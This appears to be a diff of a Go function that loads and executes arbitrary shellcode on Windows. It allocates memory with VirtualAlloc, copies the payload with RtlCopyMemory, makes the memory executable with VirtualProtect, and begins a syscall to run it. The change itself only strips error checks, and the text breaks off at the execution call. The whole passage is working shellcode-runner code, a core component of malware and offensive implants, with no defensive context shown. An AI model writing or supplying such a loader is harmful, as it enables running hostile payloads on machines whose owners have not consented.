@@ -30,43 +30,31 @@ func Execute(shellcode []byte) (error) {
   RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
 
   // Allocate memory
-  addr, _, errVirtualAlloc := VirtualAlloc.Call(
+  addr, _, _ := VirtualAlloc.Call(
     0,
     uintptr(len(shellcode)),
     windows.MEM_COMMIT | windows.MEM_RESERVE,
     windows.PAGE_READWRITE,
   )
 
-  if errVirtualAlloc != nil {
-    return fmt.Errorf("Error calling VirtualAlloc: %s", errVirtualAlloc.Error())
-  }
-
   if (addr == 0) {
     return fmt.Errorf("VirtualAlloc failed and returned 0")
   }
 
-  _, _, errRtlCopyMemory := RtlCopyMemory.Call(
+  RtlCopyMemory.Call(
     addr,
     (uintptr)(unsafe.Pointer(&shellcode[0])),
     uintptr(len(shellcode)),
   )
 
-  if errRtlCopyMemory != nil {
-    return fmt.Errorf("Error calling RtlCopyMemory: %s", errRtlCopyMemory.Error())
-  }
-
   oldProtect := windows.PAGE_READWRITE
   // Protect memory
-  _, _, errVirtualProtect := VirtualProtect.Call(
+  VirtualProtect.Call(
     addr,
     uintptr(len(shellcode)),
     windows.PAGE_EXECUTE_READ,
     uintptr(unsafe.Pointer(&oldProtect)),
   )
-
-  if errVirtualProtect != nil {
-    return fmt.Errorf("Error calling VirtualProtect: %s", errVirtualProtect.Error())
-  }
 
   // Execute shellcode
   _, _, errSyscall := syscall.Syscall(
